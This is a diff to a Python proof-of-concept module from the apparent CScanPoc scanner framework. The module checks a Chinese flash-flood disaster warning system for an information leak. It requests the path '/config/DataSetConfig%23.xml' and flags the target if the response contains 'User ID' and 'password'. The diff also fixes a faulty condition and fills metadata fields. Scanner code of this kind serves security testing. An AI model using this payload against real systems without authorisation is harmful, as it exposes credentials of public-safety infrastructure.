@@ -4,7 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'strongsoft_0011' # 平台漏洞编号，留空
+    vuln_id = 'StrongSoft_0011' # 平台漏洞编号，留空
     name = '四创灾害预警系统 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INFO_LEAK # 漏洞类型
@@ -12,11 +12,11 @@ class Vuln(ABVuln):
     desc = '''
         福建四创软件开发的“山洪灾害预警监测系统” 配置不当导致信息泄露。
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
-    product = '四创'  # 漏洞应用名称
-    product_version = '四创灾害预警系统'  # 漏洞应用版本
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
+    product = '四创灾害预警系统'  # 漏洞应用名称
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = 'ac563588-eb03-4142-94a0-eef0b56d570c'
@@ -35,7 +35,7 @@ class Poc(ABPoc):
             payload = "/config/DataSetConfig%23.xml"
             verify_url = self.target + payload
             r1 = requests.get(verify_url)
-            if 'User ID' and 'password' in r1.content:
+            if 'User ID' in r1.content and 'password' in r1.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -43,7 +43,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
